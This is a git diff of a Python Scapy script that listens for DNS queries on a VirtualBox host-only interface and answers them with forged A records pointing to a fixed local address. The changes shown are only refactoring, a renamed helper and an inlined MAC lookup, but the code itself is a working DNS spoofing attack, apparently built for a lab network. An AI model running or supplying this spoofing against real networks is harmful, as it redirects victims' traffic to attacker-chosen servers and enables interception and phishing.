@@ -7,9 +7,8 @@ INTERFACE: str = 'vboxnet0'
 IP_GATEWAY: str = '192.168.2.254'
 IP_OWN: str = '192.168.56.1'
 NEW_DNS: str = '192.168.2.15'
-OWN_MAC:str = get_if_hwaddr(INTERFACE)
 
-def typeIdToName(id: int) -> str:
+def recordTypeIdToName(id: int) -> str:
     """
     Convert type ID to name for readability
     For now, only common onces are included
@@ -32,11 +31,11 @@ def typeIdToName(id: int) -> str:
 
 def isIncoming(pkt: Packet) -> bool:
     """Filter to check, whether a packet is incoming, and not from this interface"""
-    return pkt[Ether].src != OWN_MAC
+    return pkt[Ether].src != get_if_hwaddr(INTERFACE)
 
 def get_spoof_packet(req_pkt: Packet, name: str, recordType: str) -> Packet:
     res_pkt: Packet = (
-        IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src)/
+        IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
         UDP(sport=req_pkt[IP].dport, dport=req_pkt[IP].sport)
     )
 
@@ -44,7 +43,7 @@ def get_spoof_packet(req_pkt: Packet, name: str, recordType: str) -> Packet:
         # A
         res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=NEW_DNS))
     else:
-        print(f'Type {typeIdToName(recordType)} not supported, generating empty packet...')
+        print(f'Type {recordTypeIdToName(recordType)} not supported, generating empty packet...')
 
     return res_pkt
 
@@ -55,7 +54,7 @@ def spoof_dns(pkt: Packet) -> None:
             # qdcount = the number of requested records
             name = pkt[DNS].qd[i].qname
             recordType = pkt[DNS].qd[i].qtype
-            print(f'Received DNS request from {pkt[IP].src} for {name} of type {typeIdToName(recordType)}')
+            print(f'Received DNS request from {pkt[IP].src} for {name} of type {recordTypeIdToName(recordType)}')
 
             res_pkt = get_spoof_packet(pkt, name, recordType)
             send(res_pkt, iface=INTERFACE)
